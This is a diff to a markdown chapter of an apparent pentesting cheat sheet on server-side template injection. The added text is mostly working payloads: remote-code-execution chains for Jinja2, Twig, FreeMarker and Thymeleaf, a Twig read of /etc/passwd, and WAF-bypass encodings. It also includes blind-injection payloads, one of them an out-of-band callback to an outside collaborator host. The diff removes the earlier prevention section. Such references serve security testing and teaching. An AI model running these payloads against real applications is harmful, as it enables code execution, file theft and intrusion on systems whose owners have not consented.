@@ -1,57 +1,93 @@
-# Server-Side Template Injection (SSTI)
+# SSTI: Server-Side Template Injection
 
-SSTI occurs when user input is embedded into server-side templates and executed.
+## Detection & Fingerprinting
 
-## Template Engine Detection
-| Payload | Possible Engine |
-|---------|----------------|
-| ${7*7} | Freemarker, Jinja2 |
-| {{7*7}} | Jinja2, Twig, Nunjucks |
-| #{7*7} | Ruby (ERB) |
-| <%= 7*7 %> | ERB |
-| ${{7*7}} | Smarty |
+### Universal Probe
+```
+${{<%[%'"}}%```
 
-## Payloads by Engine
+### Arithmetic Confirmation
+| Expression | Expected if evaluated |
+|-----------|----------------------|
+| `{{7*7}}` | `49` (Jinja2, Twig) |
+| `${7*7}` | `49` (FreeMarker, Velocity) |
+| `#{7*7}` | `49` (Thymeleaf) |
+| `{{7*'7'}}` | `7777777` (Jinja2) vs `49` (Twig) |
 
-### Jinja2 (Python/Flask)
+This test distinguishes Jinja2 (Python string repetition) from Twig (PHP type coercion).
+
+### Engine-Specific Fingerprinting
+```bash
+# Send payloads that produce unique error messages per engine
+# Jinja2: jinja2.exceptions.UndefinedError
+# Twig: Twig\Error\SyntaxError
+# FreeMarker: freemarker.core.ParseException
+# Velocity: org.apache.velocity.exception.ParseErrorException
+```
+
+## Exploitation Chains
+
+### Jinja2 → RCE
 ```python
-{{ 7*7 }}
+# Classic MRO traversal
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+# Find subprocess.Popen index
+{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}
+# Bypassing underscore filters with |attr()
+{{ ''|attr('__cla'+'ss__')|attr('__mr'+'o__') }}
+# Using Flask globals (lipsum/cycler) when __ is blocked
 {{ lipsum.__globals__['os'].popen('id').read() }}
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
-{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 ```
 
-### Twig (PHP/Symfony)
+### Twig → RCE
 ```php
-{{ 7*7 }}
 {{ ['id']|filter('system') }}
-{{ _self.env.registerUndefinedFilterCallback("exec") }}
-{{ _self.env.getFilter("id") }}
+{{ ['id']|map('system') }}
+// Twig 2.x sandbox bypass via undefined filter callback
+{{ '/etc/passwd'|file_get_contents }}
 ```
 
-### Freemarker (Java)
+### FreeMarker → RCE (Java)
 ```java
-${7*7}
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+// When Execute is blocked
+<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
+${ ob("java.lang.ProcessBuilder","id").start() }
 ```
 
-## Detection
-1. Identify template reflection - input appears in output
-2. Test basic math: {{7*7}} -> 49 confirms SSTI
-3. Read framework info: {{config}}, {{_self}}
-4. Escalate to RCE with engine-specific payloads
+### Thymeleaf → RCE (Spring Boot)
+```
+__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\A").next()}__::.x
+```
 
-## Tools
-- Tplmap - automated SSTI exploitation
-- Dalfox --ssti flag
-- Nuclei SSTI templates
+## WAF Bypass for SSTI
 
-## Prevention
-- Never embed user input in templates
-- Use sandboxed template engines
-- Auto-escape template output
-- Limit available functions in template context
+```bash
+# String concatenation
+{{''|attr("__cla"+"ss__")}}
+# Hex encoding underscores
+{{''|attr("\x5f\x5fclass\x5f\x5f")}}
+# URL encoding
+%7B%7B''.__class__.__mro__%7D%7D
+# Newline in payload (breaks WAF single-line rules)
+{{''.__class__
+.__mro__}}
+```
 
----
+## Blind SSTI Confirmation
 
-> **Next**: [XML External Entities (XXE)](12-xxe.md)
+```python
+# Time-based (Jinja2)
+{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('time').sleep(5) }}
+# OOB (DNS/HTTP callback)
+{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://collaborator.oastify.com/') }}
+```
+
+## Common SSTI Surfaces
+
+- Email notification templates (user-customizable subjects/bodies)
+- PDF report generators with template-based formatting
+- Error pages that render user input
+- Profile fields displayed through template engines
+- CMS template editing (admin features)
